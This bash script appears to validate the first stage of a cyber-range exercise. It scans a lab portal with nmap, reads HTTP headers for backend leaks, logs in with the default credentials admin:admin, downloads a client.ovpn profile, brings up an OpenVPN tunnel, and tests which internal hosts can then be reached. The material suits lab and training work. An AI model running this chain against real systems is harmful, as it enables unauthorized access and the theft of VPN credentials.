#!/bin/bash
# =============================================================================
# M1 — Initial reconnaissance and entry (External)  [VALIDATED]
#   1.1 nmap the External DMZ   1.2 HTTP header backend leak
#   1.3 default-cred portal login   1.4 download client.ovpn   1.5 tunnel + gate
# Run FROM Kali (10.3.10.10). Brings up the OpenVPN tunnel into CHARLIE.
# =============================================================================
set -u
PORTAL=10.3.20.10
DNS=10.3.20.20

echo "== M1.1 nmap =="
sudo nmap -Pn -sV -T4 --top-ports 50 "$PORTAL" 2>/dev/null | grep -E "open|Nmap scan"
sudo nmap -Pn -sU -p1194 "$PORTAL" 2>/dev/null | grep 1194
sudo nmap -Pn -p53 "$DNS" 2>/dev/null | grep 53

echo "== M1.2 HTTP headers (backend leak) =="
curl -sI "http://$PORTAL/" | grep -iE "X-Powered-By|X-Backend|WWW-Authenticate"

echo "== M1.3 default creds admin:admin -> dashboard lists .ovpn =="
curl -s -u admin:admin "http://$PORTAL/" | grep -ioE "client[^\"<> ]*\.ovpn" | head -1

echo "== M1.4 download client.ovpn =="
curl -s -u admin:admin -o /tmp/client.ovpn "http://$PORTAL/client.ovpn"
grep -qE "BEGIN CERTIFICATE" /tmp/client.ovpn && echo "  valid inline-cert profile" || { echo "  FAIL: no cert"; exit 1; }
# Kali's resolver doesn't serve the internal zone; use the portal IP from recon.
sed -i "s/^remote .* 1194/remote $PORTAL 1194/" /tmp/client.ovpn

echo "== M1.5 pre-tunnel gate (CHARLIE must be UNREACHABLE) =="
timeout 4 bash -c "echo > /dev/tcp/10.3.30.10/445" 2>/dev/null && echo "  PRE: reachable (BAD)" || echo "  PRE: CHARLIE blocked (good)"

echo "== M1.5 bring up the tunnel =="
sudo pkill openvpn 2>/dev/null; sleep 1
sudo bash -c "nohup openvpn --config /tmp/client.ovpn --daemon --log /tmp/ovpn.log"
for i in $(seq 1 15); do ip addr show tun0 2>/dev/null | grep -q "inet " && break; sleep 2; done
ip addr show tun0 2>/dev/null | grep -oE "inet [0-9.]+" || { echo "  FAIL: no tun0"; sudo tail -3 /tmp/ovpn.log; exit 1; }

echo "== M1.5 post-tunnel gate =="
timeout 4 nc -z 10.3.30.10 445 2>/dev/null && echo "  CHARLIE DC reachable (good)" || echo "  CHARLIE unreachable (BAD)"
timeout 4 nc -z 10.3.40.10 445 2>/dev/null && echo "  OSCAR reachable (BAD — gate leak)" || echo "  OSCAR blocked (good)"
echo "M1 PASS: tunnel up, gate holds."
